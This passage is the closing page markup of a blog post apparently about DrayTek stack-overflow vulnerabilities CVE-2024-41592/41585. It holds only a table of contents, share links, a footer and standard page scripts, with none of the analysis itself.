class="toc-link" href="#CVE-2024-41585"><span class="toc-number">2.</span> <span class="toc-text">CVE-2024-41585</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B4%E4%BD%93%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">2.2.1.</span> <span class="toc-text">整体分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">2.2.2.</span> <span class="toc-text">细节分析：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.3.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&text=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&title=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&is_video=false&description=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2024-41592/41585 DrayTek 栈溢出&body=Check out this article: http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&title=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&title=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&title=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&title=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&name=CVE-2024-41592/41585 DrayTek 栈溢出&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/11/05/2024-11-05-CVE-2024-4159241585%20DrayTek%20%E6%A0%88%E6%BA%A2%E5%87%BA/&t=CVE-2024-41592/41585 DrayTek 栈溢出"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    John Doe
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/k0mor3b1">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
